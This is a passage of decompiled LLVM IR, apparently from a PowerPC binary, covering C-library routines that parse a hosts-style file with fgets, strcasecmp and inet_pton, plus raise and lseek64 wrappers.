  store i32 %v0_1000f8b0, i32* %v3_1000f8b0, align 4
  %v0_1000f8b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f8b4 = load i32, i32* @r28, align 4
  %v2_1000f8b4 = inttoptr i32 %v1_1000f8b4 to i32*
  store i32 %v0_1000f8b4, i32* %v2_1000f8b4, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000f8bc = load i32, i32* @r28, align 4
  %v2_1000f8bc = add i32 %v1_1000f8bc, 12
  %v3_1000f8bc = inttoptr i32 %v2_1000f8bc to i32*
  store i32 16, i32* %v3_1000f8bc, align 4
  %v0_1000f8c0 = load i32, i32* @r23, align 4
  %v1_1000f8c0 = load i32, i32* @r28, align 4
  %v2_1000f8c0 = add i32 %v1_1000f8c0, 16
  %v3_1000f8c0 = inttoptr i32 %v2_1000f8c0 to i32*
  store i32 %v0_1000f8c0, i32* %v3_1000f8c0, align 4
  br label %dec_label_pc_1000f8c4

dec_label_pc_1000f8c4:                            ; preds = %dec_label_pc_1000f868, %dec_label_pc_1000f898
  %v0_1000f8c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f8c4 = load i32, i32* @r28, align 4
  %v2_1000f8c4 = add i32 %v1_1000f8c4, 4
  %v3_1000f8c4 = inttoptr i32 %v2_1000f8c4 to i32*
  store i32 %v0_1000f8c4, i32* %v3_1000f8c4, align 4
  %v0_1000f8c8 = load i32, i32* @r28, align 4
  %v1_1000f8c8 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000f8c8 = inttoptr i32 %v1_1000f8c8 to i32*
  store i32 %v0_1000f8c8, i32* %v2_1000f8c8, align 4
  br label %dec_label_pc_1000fa60

dec_label_pc_1000f8d0:                            ; preds = %dec_label_pc_1000f7c8
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000f8e0

dec_label_pc_1000f8e0:                            ; preds = %dec_label_pc_1000f840, %dec_label_pc_1000f8d0
  %v1_1000f8e8 = phi i32 [ %v1_1000f8e8.pre, %dec_label_pc_1000f840 ], [ %arg8, %dec_label_pc_1000f8d0 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000f8e8 = inttoptr i32 %v1_1000f8e8 to i32*
  store i32 1, i32* %v2_1000f8e8, align 4
  br label %dec_label_pc_1000fa48

dec_label_pc_1000f8f0:                            ; preds = %dec_label_pc_1000fa48
  %v0_1000f8f0 = load i32, i32* @r24, align 4
  store i32 %v0_1000f8f0, i32* @r3, align 4
  store i32 268499196, i32* @lr, align 4
  %v2_1000f8f8 = call i32 @__GI_strchr(i32 %v0_1000f8f0, i32 35)
  %v4_1000f8fc = icmp eq i32 %v2_1000f8f8, 0
  br i1 %v4_1000f8fc, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f904

dec_label_pc_1000f904:                            ; preds = %dec_label_pc_1000f8f0
  %v3_1000f8f8 = inttoptr i32 %v2_1000f8f8 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000f8f8, align 1
  br label %dec_label_pc_1000f90c

dec_label_pc_1000f90c:                            ; preds = %dec_label_pc_1000f8f0, %dec_label_pc_1000f904
  %v0_1000f90c = load i32, i32* @r24, align 4
  store i32 %v0_1000f90c, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000f98817 = inttoptr i32 %v0_1000f90c to i8*
  %v2_1000f98818 = load i8, i8* %v1_1000f98817, align 1
  %v3_1000f98819 = zext i8 %v2_1000f98818 to i32
  store i32 %v3_1000f98819, i32* %r0.global-to-local, align 4
  %v3_1000f98c21 = icmp eq i8 %v2_1000f98818, 0
  br i1 %v3_1000f98c21, label %dec_label_pc_1000f994, label %dec_label_pc_1000f924.preheader

dec_label_pc_1000f918:                            ; preds = %dec_label_pc_1000f934
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000f91c = inttoptr i32 %v0_1000f958 to i8*
  store i8 0, i8* %v3_1000f91c, align 1
  %v0_1000f920 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f920 = add i32 %v0_1000f920, 1
  store i32 %v1_1000f920, i32* %r11.global-to-local, align 4
  %v1_1000f924 = inttoptr i32 %v1_1000f920 to i8*
  %v2_1000f924 = load i8, i8* %v1_1000f924, align 1
  %v3_1000f924 = zext i8 %v2_1000f924 to i32
  store i32 %v3_1000f924, i32* %r0.global-to-local, align 4
  %v3_1000f928 = icmp eq i8 %v2_1000f924, 0
  br i1 %v3_1000f928, label %dec_label_pc_1000f994, label %dec_label_pc_1000f934

dec_label_pc_1000f934:                            ; preds = %dec_label_pc_1000f924.preheader, %dec_label_pc_1000f918
  %v0_1000f958 = phi i32 [ %v1_1000f920, %dec_label_pc_1000f918 ], [ %v0_1000f9242, %dec_label_pc_1000f924.preheader ]
  %v0_1000f93c.in = phi i32 [ %v3_1000f924, %dec_label_pc_1000f918 ], [ %v3_1000f9245, %dec_label_pc_1000f924.preheader ]
  %v0_1000f93c = mul nuw nsw i32 %v0_1000f93c.in, 2
  %v3_1000f938 = load i32, i32* @global_var_100249f0, align 4
  store i32 %v3_1000f938, i32* %r9.global-to-local, align 4
  %v2_1000f93c = add i32 %v3_1000f938, %v0_1000f93c
  %v3_1000f93c = inttoptr i32 %v2_1000f93c to i16*
  %v4_1000f93c = load i16, i16* %v3_1000f93c, align 2
  %v5_1000f93c = zext i16 %v4_1000f93c to i32
  store i32 %v5_1000f93c, i32* %r0.global-to-local, align 4
  %v1_1000f940 = and i32 %v5_1000f93c, 32
  store i32 %v1_1000f940, i32* %r9.global-to-local, align 4
  %v3_1000f940 = icmp eq i32 %v1_1000f940, 0
  br i1 %v3_1000f940, label %dec_label_pc_1000f948, label %dec_label_pc_1000f918

dec_label_pc_1000f948:                            ; preds = %dec_label_pc_1000f934
  %v0_1000f948 = load i32, i32* @r29, align 4
  %v2_1000f948 = icmp sgt i32 %v0_1000f948, 6
  br i1 %v2_1000f948, label %dec_label_pc_1000f964.preheader, label %dec_label_pc_1000f950

dec_label_pc_1000f950:                            ; preds = %dec_label_pc_1000f948
  %v1_1000f950 = mul i32 %v0_1000f948, 4
  store i32 %v1_1000f950, i32* %r0.global-to-local, align 4
  %v1_1000f954 = add i32 %v0_1000f948, 1
  store i32 %v1_1000f954, i32* @r29, align 4
  %v1_1000f958 = load i32, i32* @r30, align 4
  %v3_1000f958 = add i32 %v1_1000f958, %v1_1000f950
  %v4_1000f958 = inttoptr i32 %v3_1000f958 to i32*
  store i32 %v0_1000f958, i32* %v4_1000f958, align 4
  %v0_1000f9649.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f964.preheader

dec_label_pc_1000f964.preheader:                  ; preds = %dec_label_pc_1000f950, %dec_label_pc_1000f948
  %v0_1000f9649 = phi i32 [ %v0_1000f9649.pre, %dec_label_pc_1000f950 ], [ %v0_1000f958, %dec_label_pc_1000f948 ]
  %v1_1000f96410 = inttoptr i32 %v0_1000f9649 to i8*
  %v2_1000f96411 = load i8, i8* %v1_1000f96410, align 1
  %v3_1000f96412 = zext i8 %v2_1000f96411 to i32
  store i32 %v3_1000f96412, i32* %r0.global-to-local, align 4
  %v3_1000f96814 = icmp eq i8 %v2_1000f96411, 0
  br i1 %v3_1000f96814, label %dec_label_pc_1000f988.loopexit, label %dec_label_pc_1000f974.lr.ph

dec_label_pc_1000f974.lr.ph:                      ; preds = %dec_label_pc_1000f964.preheader
  %v3_1000f978.pre = load i32, i32* @global_var_100249f0, align 4
  br label %dec_label_pc_1000f974

dec_label_pc_1000f960:                            ; preds = %dec_label_pc_1000f974
  %v1_1000f960 = add i32 %v0_1000f960, 1
  store i32 %v1_1000f960, i32* %r11.global-to-local, align 4
  %v1_1000f964 = inttoptr i32 %v1_1000f960 to i8*
  %v2_1000f964 = load i8, i8* %v1_1000f964, align 1
  %v3_1000f964 = zext i8 %v2_1000f964 to i32
  store i32 %v3_1000f964, i32* %r0.global-to-local, align 4
  %v3_1000f968 = icmp eq i8 %v2_1000f964, 0
  br i1 %v3_1000f968, label %dec_label_pc_1000f988.loopexit, label %dec_label_pc_1000f974

dec_label_pc_1000f974:                            ; preds = %dec_label_pc_1000f974.lr.ph, %dec_label_pc_1000f960
  %v0_1000f960 = phi i32 [ %v0_1000f9649, %dec_label_pc_1000f974.lr.ph ], [ %v1_1000f960, %dec_label_pc_1000f960 ]
  %v0_1000f97c.in = phi i32 [ %v3_1000f96412, %dec_label_pc_1000f974.lr.ph ], [ %v3_1000f964, %dec_label_pc_1000f960 ]
  %v0_1000f97c = mul nuw nsw i32 %v0_1000f97c.in, 2
  store i32 %v3_1000f978.pre, i32* %r9.global-to-local, align 4
  %v2_1000f97c = add i32 %v0_1000f97c, %v3_1000f978.pre
  %v3_1000f97c = inttoptr i32 %v2_1000f97c to i16*
  %v4_1000f97c = load i16, i16* %v3_1000f97c, align 2
  %v5_1000f97c = zext i16 %v4_1000f97c to i32
  store i32 %v5_1000f97c, i32* %r0.global-to-local, align 4
  %v1_1000f980 = and i32 %v5_1000f97c, 32
  store i32 %v1_1000f980, i32* %r9.global-to-local, align 4
  %v3_1000f980 = icmp eq i32 %v1_1000f980, 0
  br i1 %v3_1000f980, label %dec_label_pc_1000f960, label %dec_label_pc_1000f988.loopexit

dec_label_pc_1000f988.loopexit:                   ; preds = %dec_label_pc_1000f974, %dec_label_pc_1000f960, %dec_label_pc_1000f964.preheader
  %v0_1000f988 = phi i32 [ %v0_1000f9649, %dec_label_pc_1000f964.preheader ], [ %v0_1000f960, %dec_label_pc_1000f974 ], [ %v1_1000f960, %dec_label_pc_1000f960 ]
  %v1_1000f988 = inttoptr i32 %v0_1000f988 to i8*
  %v2_1000f988 = load i8, i8* %v1_1000f988, align 1
  %v3_1000f988 = zext i8 %v2_1000f988 to i32
  store i32 %v3_1000f988, i32* %r0.global-to-local, align 4
  %v3_1000f98c = icmp eq i8 %v2_1000f988, 0
  br i1 %v3_1000f98c, label %dec_label_pc_1000f994, label %dec_label_pc_1000f924.preheader

dec_label_pc_1000f924.preheader:                  ; preds = %dec_label_pc_1000f90c, %dec_label_pc_1000f988.loopexit
  %v0_1000f9242 = phi i32 [ %v0_1000f988, %dec_label_pc_1000f988.loopexit ], [ %v0_1000f90c, %dec_label_pc_1000f90c ]
  %v1_1000f9243 = inttoptr i32 %v0_1000f9242 to i8*
  %v2_1000f9244 = load i8, i8* %v1_1000f9243, align 1
  %v3_1000f9245 = zext i8 %v2_1000f9244 to i32
  store i32 %v3_1000f9245, i32* %r0.global-to-local, align 4
  %v3_1000f9287 = icmp eq i8 %v2_1000f9244, 0
  br i1 %v3_1000f9287, label %dec_label_pc_1000f994, label %dec_label_pc_1000f934

dec_label_pc_1000f994:                            ; preds = %dec_label_pc_1000f988.loopexit, %dec_label_pc_1000f924.preheader, %dec_label_pc_1000f918, %dec_label_pc_1000f90c
  %v0_1000f994 = load i32, i32* @r29, align 4
  %v1_1000f998 = mul i32 %v0_1000f994, 4
  store i32 %v1_1000f998, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000f9a0 = load i32, i32* @r30, align 4
  %v3_1000f9a0 = add i32 %v2_1000f9a0, %v1_1000f998
  %v4_1000f9a0 = inttoptr i32 %v3_1000f9a0 to i32*
  store i32 0, i32* %v4_1000f9a0, align 4
  %tmp55 = icmp slt i32 %v0_1000f994, 2
  br i1 %tmp55, label %dec_label_pc_1000fa48, label %dec_label_pc_1000f9a8

dec_label_pc_1000f9a8:                            ; preds = %dec_label_pc_1000f994
  %v0_1000f9a8 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000f9a8 = icmp eq i32 %v0_1000f9a8, 1
  br i1 %v3_1000f9a8, label %dec_label_pc_1000fa60, label %dec_label_pc_1000f9b0

dec_label_pc_1000f9b0:                            ; preds = %dec_label_pc_1000f9a8
  %v3_1000f9b0 = icmp eq i32 %v0_1000f9a8, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000f9b0, label %dec_label_pc_1000f9bc, label %dec_label_pc_1000f9e8.preheader

dec_label_pc_1000f9e8.preheader:                  ; preds = %dec_label_pc_1000f9b0
  %v1_1000f9e823 = load i32, i32* @r29, align 4
  %v2_1000f9e824 = icmp sgt i32 %v1_1000f9e823, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000f9f029 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000f9f029, i32* @r3, align 4
  br i1 %v2_1000f9e824, label %dec_label_pc_1000f9d4, label %dec_label_pc_1000f9f8

dec_label_pc_1000f9bc:                            ; preds = %dec_label_pc_1000f9b0
  %v0_1000f9bc = load i32, i32* @r30, align 4
  %v1_1000f9bc = inttoptr i32 %v0_1000f9bc to i32*
  %v2_1000f9bc = load i32, i32* %v1_1000f9bc, align 4
  store i32 %v2_1000f9bc, i32* @r4, align 4
  %v0_1000f9c0 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000f9c4 = inttoptr i32 %v0_1000f9c0 to i8*
  %v3_1000f9c4 = call i32 @__GI_strcoll(i8* %v2_1000f9c4, i32 %v2_1000f9bc)
  %v3_1000f9c8 = icmp eq i32 %v3_1000f9c4, 0
  br i1 %v3_1000f9c8, label %dec_label_pc_1000fa00, label %dec_label_pc_1000fa48

dec_label_pc_1000f9d4:                            ; preds = %dec_label_pc_1000f9e8.preheader, %dec_label_pc_1000f9e4
  %v1_1000f9d4 = phi i32 [ %v1_1000f9ec, %dec_label_pc_1000f9e4 ], [ 4, %dec_label_pc_1000f9e8.preheader ]
  %v0_1000f9f031 = phi i32 [ %v0_1000f9f0, %dec_label_pc_1000f9e4 ], [ %v0_1000f9f029, %dec_label_pc_1000f9e8.preheader ]
  %v0_1000f9d4 = load i32, i32* @r30, align 4
  %v2_1000f9d4 = add i32 %v0_1000f9d4, %v1_1000f9d4
  %v3_1000f9d4 = inttoptr i32 %v2_1000f9d4 to i32*
  %v4_1000f9d4 = load i32, i32* %v3_1000f9d4, align 4
  store i32 %v4_1000f9d4, i32* @r4, align 4
  %v2_1000f9d8 = call i32 @__GI_strcasecmp(i32 %v0_1000f9f031, i32 %v4_1000f9d4)
  %v3_1000f9dc = icmp eq i32 %v2_1000f9d8, 0
  %v0_1000f9f8.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000f9dc, label %dec_label_pc_1000f9d4.dec_label_pc_1000f9f8_crit_edge, label %dec_label_pc_1000f9e4

dec_label_pc_1000f9e4:                            ; preds = %dec_label_pc_1000f9d4
  %v1_1000f9e4 = add i32 %v0_1000f9f8.pre, 1
  store i32 %v1_1000f9e4, i32* @r31, align 4
  %v1_1000f9e8 = load i32, i32* @r29, align 4
  %v2_1000f9e8 = icmp slt i32 %v1_1000f9e4, %v1_1000f9e8
  %v1_1000f9ec = mul i32 %v1_1000f9e4, 4
  store i32 %v1_1000f9ec, i32* %r0.global-to-local, align 4
  %v0_1000f9f0 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000f9f0, i32* @r3, align 4
  br i1 %v2_1000f9e8, label %dec_label_pc_1000f9d4, label %dec_label_pc_1000f9f8

dec_label_pc_1000f9d4.dec_label_pc_1000f9f8_crit_edge: ; preds = %dec_label_pc_1000f9d4
  %v1_1000f9f8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000f9f8

dec_label_pc_1000f9f8:                            ; preds = %dec_label_pc_1000f9e4, %dec_label_pc_1000f9d4.dec_label_pc_1000f9f8_crit_edge, %dec_label_pc_1000f9e8.preheader
  %v1_1000f9f8 = phi i32 [ %v1_1000f9f8.pre, %dec_label_pc_1000f9d4.dec_label_pc_1000f9f8_crit_edge ], [ %v1_1000f9e823, %dec_label_pc_1000f9e8.preheader ], [ %v1_1000f9e8, %dec_label_pc_1000f9e4 ]
  %v0_1000f9f8 = phi i32 [ %v0_1000f9f8.pre, %dec_label_pc_1000f9d4.dec_label_pc_1000f9f8_crit_edge ], [ 1, %dec_label_pc_1000f9e8.preheader ], [ %v1_1000f9e4, %dec_label_pc_1000f9e4 ]
  %v2_1000f9f8 = icmp slt i32 %v0_1000f9f8, %v1_1000f9f8
  br i1 %v2_1000f9f8, label %dec_label_pc_1000fa00, label %dec_label_pc_1000fa48

dec_label_pc_1000fa00:                            ; preds = %dec_label_pc_1000f9bc, %dec_label_pc_1000f9f8
  %v0_1000fa00 = load i32, i32* %r19.global-to-local, align 4
  %v3_1000fa00 = icmp eq i32 %v0_1000fa00, 2
  br i1 %v3_1000fa00, label %dec_label_pc_1000fa08, label %dec_label_pc_1000fa24

dec_label_pc_1000fa08:                            ; preds = %dec_label_pc_1000fa00
  %v0_1000fa08 = load i32, i32* @r30, align 4
  %v1_1000fa08 = inttoptr i32 %v0_1000fa08 to i32*
  %v2_1000fa08 = load i32, i32* %v1_1000fa08, align 4
  %v0_1000fa10 = load i32, i32* @r25, align 4
  store i32 268499480, i32* @lr, align 4
  %v3_1000fa14 = inttoptr i32 %v2_1000fa08 to i8*
  %v4_1000fa14 = call i32 @inet_pton(i32 2, i8* %v3_1000fa14, i32 %v0_1000fa10)
  %v2_1000fa18 = icmp sgt i32 %v4_1000fa14, 0
  br i1 %v2_1000fa18, label %dec_label_pc_1000f868, label %dec_label_pc_1000fa44

dec_label_pc_1000fa24:                            ; preds = %dec_label_pc_1000fa00
  %v3_1000fa24 = icmp eq i32 %v0_1000fa00, 10
  br i1 %v3_1000fa24, label %dec_label_pc_1000fa2c, label %dec_label_pc_1000fa44

dec_label_pc_1000fa2c:                            ; preds = %dec_label_pc_1000fa24
  %v0_1000fa2c = load i32, i32* @r30, align 4
  %v1_1000fa2c = inttoptr i32 %v0_1000fa2c to i32*
  %v2_1000fa2c = load i32, i32* %v1_1000fa2c, align 4
  %v0_1000fa34 = load i32, i32* %r21.global-to-local, align 4
  store i32 268499516, i32* @lr, align 4
  %v3_1000fa38 = inttoptr i32 %v2_1000fa2c to i8*
  %v4_1000fa38 = call i32 @inet_pton(i32 10, i8* %v3_1000fa38, i32 %v0_1000fa34)
  %v2_1000fa3c = icmp sgt i32 %v4_1000fa38, 0
  br i1 %v2_1000fa3c, label %dec_label_pc_1000f898, label %dec_label_pc_1000fa44

dec_label_pc_1000fa44:                            ; preds = %dec_label_pc_1000fa08, %dec_label_pc_1000fa24, %dec_label_pc_1000fa2c
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000fa48

dec_label_pc_1000fa48:                            ; preds = %dec_label_pc_1000f9f8, %dec_label_pc_1000f9bc, %dec_label_pc_1000f994, %dec_label_pc_1000fa44, %dec_label_pc_1000f8e0
  %v0_1000fa48 = load i32, i32* @r24, align 4
  %v0_1000fa4c = load i32, i32* @r27, align 4
  %v0_1000fa50 = load i32, i32* @r20, align 4
  store i32 268499544, i32* @lr, align 4
  %v3_1000fa54 = call i32 @fgets(i32 %v0_1000fa48, i32 %v0_1000fa4c, i32 %v0_1000fa50)
  %v3_1000fa58 = icmp eq i32 %v3_1000fa54, 0
  br i1 %v3_1000fa58, label %dec_label_pc_1000fa60, label %dec_label_pc_1000f8f0

dec_label_pc_1000fa60:                            ; preds = %dec_label_pc_1000fa48, %dec_label_pc_1000f9a8, %dec_label_pc_1000f8c4
  %v0_1000fa60 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000fa60 = icmp eq i32 %v0_1000fa60, 1
  br i1 %v3_1000fa60, label %dec_label_pc_1000fa78, label %dec_label_pc_1000fa68

dec_label_pc_1000fa68:                            ; preds = %dec_label_pc_1000fa60
  %v0_1000fa68 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000fa70.697 to i32), i32* @lr, align 4
  %v1_1000fa6c = inttoptr i32 %v0_1000fa68 to i16*
  %v2_1000fa6c = call i32 @__GI_fclose(i16* %v1_1000fa6c)
  br label %dec_label_pc_1000fa78

dec_label_pc_1000fa74:                            ; preds = %dec_label_pc_1000f82c, %dec_label_pc_1000f7fc, %dec_label_pc_1000f7f4, %dec_label_pc_1000f7e8, %dec_label_pc_1000f7d8, %dec_label_pc_1000f7c0, %dec_label_pc_1000f7b0
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000fa78

dec_label_pc_1000fa78:                            ; preds = %dec_label_pc_1000fa60, %dec_label_pc_1000fa68, %dec_label_pc_1000f858, %dec_label_pc_1000fa74
  store i32 %v0_1000f774, i32* %r0.global-to-local, align 4
  %v0_1000fa7c = load i32, i32* @r26, align 4
  ret i32 %v0_1000fa7c

; uselistorder directives
  uselistorder i32 %v0_1000f9f0, { 1, 0 }
  uselistorder i32 %v1_1000f9e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000f998, { 1, 0 }
  uselistorder i32 %v0_1000f994, { 1, 0 }
  uselistorder i32 %v3_1000f9245, { 1, 0 }
  uselistorder i32 %v0_1000f9242, { 1, 0 }
  uselistorder i32 %v1_1000f950, { 1, 0 }
  uselistorder i32 %v0_1000f948, { 1, 0, 2 }
  uselistorder i32 %v2_1000f8f8, { 1, 0 }
  uselistorder i32 %v0_1000f7e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000f7c0.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000f78c, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 30, 12, 27, 19, 13, 14, 28, 15, 16, 18, 17, 29, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 5, 6, 9, 1, 2, 3, 7, 8, 4, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 10, { 12, 32, 33, 34, 35, 36, 37, 38, 23, 24, 20, 21, 22, 40, 39, 41, 42, 6, 44, 1, 27, 2, 28, 0, 7, 13, 47, 14, 25, 15, 26, 31, 8, 29, 30, 16, 9, 4, 5, 19, 43, 17, 3, 11, 10, 46, 18, 45 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 10, 11, 12, 13, 0, 1, 2, 3, 14, 15, 16, 17, 18, 19, 20, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 6, { 28, 29, 30, 31, 32, 0, 1, 2, 20, 21, 22, 23, 10, 11, 34, 3, 24, 25, 6, 4, 26, 12, 27, 5, 13, 14, 15, 16, 17, 7, 8, 18, 9, 19, 33 }
  uselistorder i32* @global_var_100249f0, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 42, 43, 44, 0, 45, 46, 47, 13, 17, 48, 63, 8, 9, 10, 14, 49, 26, 27, 28, 29, 30, 31, 32, 33, 5, 6, 34, 35, 36, 69, 18, 40, 62, 19, 64, 65, 66, 67, 4, 20, 68, 1, 2, 7, 21, 3, 15, 52, 53, 54, 55, 70, 37, 38, 50, 51, 22, 23, 24, 25, 11, 12, 39, 16, 41, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 80, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 48, { 24, 10, 11, 12, 1, 13, 14, 5, 15, 16, 2, 17, 18, 19, 7, 20, 6, 21, 3, 0, 22, 23, 25, 8, 9, 4 }
  uselistorder i32 36, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 4, 5, 3, 1, 0, 2 }
  uselistorder i32 -48, { 3, 5, 4, 6, 1, 2, 0 }
  uselistorder i32 16, { 52, 11, 53, 54, 12, 55, 56, 0, 57, 58, 1, 59, 13, 60, 61, 26, 27, 62, 72, 73, 63, 64, 65, 66, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 83, 41, 4, 23, 21, 49, 22, 74, 75, 87, 88, 89, 90, 67, 68, 42, 43, 44, 45, 46, 47, 84, 85, 86, 69, 2, 70, 71, 14, 15, 24, 25, 6, 8, 7, 16, 48, 17, 20, 50, 5, 51, 18, 76, 77, 78, 79, 80, 19, 81, 3, 82, 9, 10 }
  uselistorder i32* @r27, { 43, 44, 45, 46, 47, 48, 1, 49, 50, 51, 52, 12, 13, 6, 14, 3, 2, 53, 54, 55, 56, 61, 0, 62, 63, 64, 65, 73, 74, 75, 76, 77, 78, 20, 21, 85, 4, 86, 7, 87, 92, 15, 16, 83, 84, 79, 80, 81, 82, 88, 89, 90, 22, 23, 66, 67, 68, 24, 25, 5, 26, 27, 28, 29, 8, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 9, 10, 11, 91, 69, 70, 71, 72, 41, 42, 57, 58, 59, 60, 17, 18, 19 }
  uselistorder i32 32, { 57, 58, 59, 26, 60, 61, 27, 17, 18, 66, 67, 45, 28, 25, 46, 47, 14, 15, 37, 38, 36, 2, 3, 4, 16, 13, 64, 62, 63, 48, 49, 29, 50, 51, 52, 53, 54, 55, 56, 0, 68, 69, 65, 39, 40, 41, 1, 21, 42, 43, 44, 22, 30, 31, 6, 5, 8, 19, 7, 32, 10, 9, 33, 34, 12, 20, 11, 35, 23, 24 }
  uselistorder i32* @r10, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 4, { 4, 111, 132, 5, 6, 225, 223, 224, 145, 226, 227, 228, 127, 7, 229, 230, 231, 232, 233, 234, 235, 8, 236, 9, 10, 11, 133, 237, 239, 146, 240, 241, 242, 12, 13, 128, 181, 14, 15, 182, 183, 184, 185, 186, 187, 243, 147, 16, 17, 298, 299, 148, 18, 19, 116, 20, 21, 22, 23, 24, 25, 251, 252, 149, 26, 27, 2, 28, 0, 188, 3, 29, 1, 253, 150, 30, 246, 247, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 300, 201, 117, 314, 321, 31, 32, 33, 34, 35, 301, 302, 36, 303, 37, 304, 38, 39, 164, 40, 41, 165, 42, 219, 220, 221, 270, 271, 272, 43, 166, 44, 45, 46, 167, 47, 168, 169, 278, 280, 279, 276, 277, 170, 171, 172, 173, 281, 282, 283, 284, 285, 286, 287, 288, 289, 48, 174, 49, 254, 151, 255, 256, 118, 50, 51, 257, 52, 258, 259, 260, 261, 262, 263, 129, 53, 264, 130, 305, 306, 202, 54, 55, 56, 131, 57, 138, 297, 58, 59, 238, 60, 61, 315, 316, 317, 152, 318, 319, 320, 62, 307, 308, 309, 114, 115, 310, 311, 153, 312, 313, 63, 64, 65, 66, 67, 68, 69, 70, 203, 71, 204, 205, 135, 206, 207, 208, 209, 210, 72, 73, 211, 212, 136, 213, 214, 137, 215, 216, 218, 74, 75, 112, 113, 217, 248, 76, 249, 154, 250, 244, 245, 77, 78, 119, 79, 175, 80, 120, 81, 82, 83, 84, 176, 155, 177, 178, 179, 180, 139, 141, 140, 142, 85, 86, 156, 161, 162, 87, 134, 88, 222, 143, 265, 157, 266, 267, 268, 269, 121, 89, 122, 90, 273, 91, 158, 144, 159, 92, 123, 160, 93, 94, 95, 124, 274, 125, 96, 126, 97, 98, 275, 99, 100, 101, 290, 102, 291, 103, 292, 104, 293, 105, 294, 106, 295, 107, 296, 108, 109, 110, 163 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000fa78, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fa48, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000fa44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fa00, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f9d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f994, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f924.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000f974, { 1, 0 }
  uselistorder label %dec_label_pc_1000f90c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f8e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f8c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f82c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7c0, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000fa90 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268499624, i32* @lr, align 4
  %v0_1000faa4 = call i32 @__libc_getpid()
  %v0_1000faac = load i32, i32* @r29, align 4
  store i32 %v0_1000fa90, i32* @lr, align 4
  %v2_1000fabc = call i32 @kill(i32 %v0_1000faa4, i32 %v0_1000faac)
  ret i32 %v2_1000fabc

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000fac0 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000faec = call i32 @__asm_mfcr()
  %v1_1000faf0 = and i32 %v0_1000faec, 268435456
  %v3_1000faf0 = icmp eq i32 %v1_1000faf0, 0
  store i32 %v0_1000faec, i32* %r31.global-to-local, align 4
  store i32 %v0_1000faec, i32* %r0.global-to-local, align 4
